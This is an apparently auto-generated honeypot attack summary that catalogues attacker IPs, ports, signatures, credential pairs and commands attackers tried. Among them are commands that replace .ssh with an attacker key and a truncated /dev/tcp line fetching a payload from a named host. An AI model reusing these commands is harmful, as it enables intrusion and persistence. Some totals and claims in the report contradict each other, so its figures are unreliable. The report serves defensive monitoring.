Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-11T16:01:26Z
**Timeframe:** 2025-10-11T15:20:01Z to 2025-10-11T16:00:02Z
**Files Used:**
- agg_log_20251011T152001Z.json
- agg_log_20251011T154002Z.json
- agg_log_20251011T160002Z.json

### Executive Summary
This report summarizes 18,087 malicious events targeting our honeypot infrastructure over the last hour. The primary attack vectors observed were SSH brute-force attempts and scans for common vulnerabilities. A significant portion of the attacks originated from a small number of IP addresses, suggesting targeted campaigns. The most frequently observed activity involved attempts to deploy malware and add SSH keys for persistent access.

### Detailed Analysis

**Attacks by Honeypot:**
* Cowrie: 8048
* Dionaea: 1651
* Honeytrap: 2477
* Suricata: 1982
* Ciscoasa: 1719
* Redishoneypot: 857
* Heralding: 553
* ssh-rsa: 84
* Sentrypeer: 104
* Miniprint: 70
* Tanner: 34
* Mailoney: 35
* ConPot: 16
* Adbhoney: 15
* H0neytr4p: 37
* ElasticPot: 3
* Ipphoney: 2

**Top Attacking IPs:**
* 47.180.61.210: 1606
* 125.230.212.251: 1562
* 20.226.87.51: 1255
* 10.140.0.3: 552
* 157.245.101.239: 286
* 113.30.191.232: 218
* 173.212.228.191: 213
* 103.51.216.210: 193
* 5.198.176.28: 183
* 45.119.84.54: 174
* 178.128.147.10: 234
* 186.235.28.12: 238
* 12.156.67.18: 163
* 93.113.63.124: 139
* 114.204.9.108: 139
* 175.6.37.135: 149

**Top Targeted Ports/Protocols:**
* 445: 1612
* 22: 1159
* 6379: 1257
* TCP/5900: 282
* vnc/5900: 550
* 5903: 194
* 5060: 104
* 1221: 117
* 9100: 62
* 443: 29
* 23: 34
* 25: 39

**Most Common CVEs:**
* CVE-2002-0013 CVE-2002-0012: 3
* CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 3
* CVE-2023-49103 CVE-2023-49103: 2
* CVE-2001-0414: 1
* CVE-2006-2369: 1

**Commands Attempted by Attackers:**
* cd ~; chattr -ia .ssh; lockr -ia .ssh
* lockr -ia .ssh
* cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
* cat /proc/cpuinfo | grep name | wc -l
* free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
* crontab -l
* uname -a
* whoami
* Enter new UNIX password:

**Signatures Triggered:**
* ET DROP Dshield Block Listed Source group 1: 339
* 2402000: 339
* ET INFO VNC Authentication Failure: 548
* 2002920: 548
* ET DROP Spamhaus DROP Listed Traffic Inbound group 42: 180
* 2400041: 180
* ET SCAN NMAP -sS window 1024: 157
* 2009582: 157
* ET SCAN MS Terminal Server Traffic on Non-standard Port: 88
* 2023753: 88
* ET INFO Reserved Internal IP Traffic: 60
* 2002752: 60
* ET SCAN Potential SSH Scan: 47
* 2001219: 47
* ET HUNTING RDP Authentication Bypass Attempt: 31
* 2034857: 31

**Users / Login Attempts:**
* root/: 84
* 345gs5662d34/345gs5662d34: 36
* root/nPSpP4PBW0: 17
* root/Ahgf3487@rtjhskl854hd47893@#a4nC: 14
* Admin/Password1: 8
* sa/: 6
* support/Support2004: 6
* admin/77777777: 4
* root/L3n1nm0r3n0.: 4
* root/b1l4t3r4l: 4
* unknown/112233: 4

**Files Uploaded/Downloaded:**
* arm.urbotnetisass
* arm5.urbotnetisass
* arm6.urbotnetisass
* arm7.urbotnetisass
* x86_32.urbotnetisass
* mips.urbotnetisass
* mipsel.urbotnetisass
* fonts.gstatic.com
* css?family=Libre+Franklin...
* ie8.css?ver=1.0
* html5.js?ver=3.7.3

**HTTP User-Agents:**
* No significant User-Agent data was captured during this period.

**SSH Clients and Servers:**
* No significant SSH client or server data was captured during this period.

**Top Attacker AS Organizations:**
* No significant attacker AS organization data was captured during this period.

### Key Observations and Anomalies
- **Persistent SSH Attacks:** A large number of commands are focused on manipulating the `.ssh` directory, indicating a clear intent to establish persistent access via SSH keys.
- **Malware Delivery:** The `nohup bash -c "exec 6<>/dev/tcp/47.120.55.164/60128 ..."` commands are attempting to download and execute a payload from a remote server, which is a common malware delivery technique. The IP `47.120.55.164` should be investigated and blocked.
- **VNC Failures:** The high number of "ET INFO VNC Authentication Failure" signatures suggests widespread scanning for open VNC servers.
- **Credential Stuffing:** The variety of usernames and passwords indicates automated brute-force attacks using common or previously breached credentials.
- **Lack of Sophistication:** The observed attacks, while numerous, are largely automated and rely on common exploits and weak credentials. They do not appear to be highly targeted or sophisticated in nature.
